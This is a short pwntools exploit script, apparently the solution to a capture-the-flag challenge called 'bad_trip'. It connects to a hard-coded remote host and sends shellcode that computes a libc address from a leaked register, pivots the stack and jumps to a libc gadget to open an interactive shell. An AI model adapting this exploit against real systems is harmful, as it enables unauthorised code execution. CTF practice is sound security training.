#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./bad_trip_patched")
libc = ELF("lib/libc.so.6")
ld = ELF("lib/ld-linux-x86-64.so.2")
context.binary = exe

# io = gdb.debug(exe.path, 'b* main+241\nc\nb*  0x1337131000\nc')
io = remote('172.210.129.230', 1352)
code = '''
    sub r13, 0x80
    mov r13, [r13]
    sub r13, 0x27d8a
    mov r14, r13
    add r14, 0xdabb3
    mov rbp, 0x6969696500
    mov rsp, 0x6969696500
    push r14
    mov rdi, 0
    ret
'''

io.sendlineafter(b'>> ', asm(code))
io.interactive()
